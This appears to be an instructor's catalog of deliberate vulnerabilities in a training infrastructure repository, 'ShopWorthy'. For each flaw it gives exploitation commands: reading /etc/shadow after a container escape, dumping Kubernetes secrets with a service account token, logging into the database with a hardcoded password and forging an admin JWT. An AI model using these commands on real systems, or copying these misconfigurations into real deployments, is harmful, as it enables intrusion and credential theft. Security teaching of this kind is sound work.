# ShopWorthy Infra — Vulnerability Catalog

> **Instructor-facing document.** This file documents every intentional vulnerability in the `infra` repository, including exploitation steps and example payloads.

---

## VULN-INFRA-001 — Secrets Committed to Repository

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-001 |
| **Type** | Sensitive Data Exposure |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Severity** | Critical |
| **File** | `.env` (repo root) |

### Description
The `.env` file contains all service secrets in plaintext and is committed directly to the repository. It is not in `.gitignore`. Any attacker with read access to the repository can retrieve all credentials.

### Exploitation Steps
1. Browse to the repository on GitHub: `https://github.com/ShopWorthy/infra`
2. Open `.env`
3. Extract: JWT secret, DB password, gateway API key, admin credentials

### Payload
```bash
curl -s https://raw.githubusercontent.com/ShopWorthy/infra/master/.env
```

---

## VULN-INFRA-002 — Privileged Docker Container

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-002 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | High |
| **File** | `docker-compose.yml` (line ~33) |

### Description
The `payments` service runs with `privileged: true`, giving the container full access to the host's kernel and devices. A container escape from the payments service grants root on the host.

### Exploitation Steps
1. Gain code execution inside the payments container (e.g., via Log4Shell VULN-PAY-001)
2. Use privileged mode to mount the host filesystem:
   ```bash
   mkdir /mnt/host && mount /dev/sda1 /mnt/host
   cat /mnt/host/etc/shadow
   ```

---

## VULN-INFRA-003 — Database Exposed to Host Network

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-003 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | High |
| **File** | `docker-compose.yml` (postgres service) |

### Description
PostgreSQL port 5432 is mapped to `0.0.0.0:5432` with a weak, hardcoded password. Any host that can reach the machine can connect directly to the database.

### Exploitation Steps
```bash
psql -h <target-ip> -p 5432 -U shopworthy -d inventory
# Password: shopworthy123
\dt
SELECT * FROM suppliers;
SELECT api_key FROM suppliers;
```

---

## VULN-INFRA-004 — Public S3 Bucket (Terraform)

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-004 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | High |
| **File** | `terraform/s3.tf` |

### Description
The Terraform configuration creates an S3 bucket with `acl = "public-read"` and disables all public access blocks. Any file uploaded to this bucket is publicly readable.

### Exploitation Steps
1. Apply Terraform: `terraform apply`
2. List bucket contents:
   ```bash
   aws s3 ls s3://shopworthy-exports-dev/ --no-sign-request
   aws s3 cp s3://shopworthy-exports-dev/export.csv . --no-sign-request
   ```

---

## VULN-INFRA-005 — Overly Permissive Kubernetes RBAC

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-005 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | Critical |
| **File** | `k8s/rbac.yaml` |

### Description
The default service account in the `shopworthy` namespace is bound to `cluster-admin`, giving any pod in the namespace full control over the entire Kubernetes cluster.

### Exploitation Steps
1. Gain code execution in any pod in the shopworthy namespace
2. Use the mounted service account token:
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   curl -sk -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/secrets
   ```
3. List all secrets cluster-wide, read other namespaces, create privileged pods

---

## VULN-INFRA-006 — No Network Segmentation

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-006 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | Medium |
| **File** | `docker-compose.yml` |

### Description
All services share a single default Docker network. There are no network policies separating the frontend from internal services. A compromised frontend container can directly reach inventory, payments, and admin services.

### Exploitation Steps
1. Gain RCE on the frontend container
2. Directly query internal services:
   ```bash
   curl http://payments:6000/actuator/env
   curl http://inventory:5000/internal/deserialize
   curl http://api:4000/internal/config
   ```

---

## VULN-INFRA-007 — Hardcoded Secrets in Terraform Variables

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-007 |
| **Type** | Sensitive Data Exposure |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Severity** | High |
| **File** | `terraform/variables.tf` |

### Description
Terraform variable defaults contain plaintext secrets (`db_password`, `jwt_secret`, `gateway_api_key`). These values are committed to the repository and will be used by `terraform apply` if no override is provided.

### Exploitation Steps
1. Clone the repo and view `terraform/variables.tf`
2. Extract: `db_password = "shopworthy123"`, `jwt_secret = "shopworthy-secret-2024"`
3. Use the JWT secret to forge arbitrary tokens:
   ```python
   import jwt
   token = jwt.encode({"id":1,"role":"admin"}, "shopworthy-secret-2024", algorithm="HS256")
   ```

---

## VULN-INFRA-008 — CI/CD Secrets Exposed in GitHub Actions Logs

| Field | Detail |
|-------|--------|
| **ID** | VULN-INFRA-008 |
| **Type** | Sensitive Data Exposure |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Severity** | High |
| **File** | `.github/workflows/deploy.yml` |

### Description
The GitHub Actions workflow prints `${{ secrets.GATEWAY_KEY }}` and `${{ secrets.JWT_SECRET }}` directly in `echo` commands within `run` steps. Additionally, plaintext secrets are passed as environment variables (`API_SECRET`, `DB_PASSWORD`) which can be visible in workflow logs.

### Exploitation Steps
1. Browse to the GitHub Actions tab on the repository
2. Open any `Deploy ShopWorthy` workflow run
3. Expand the `Deploy to EC2` step to see printed secret values in the log output
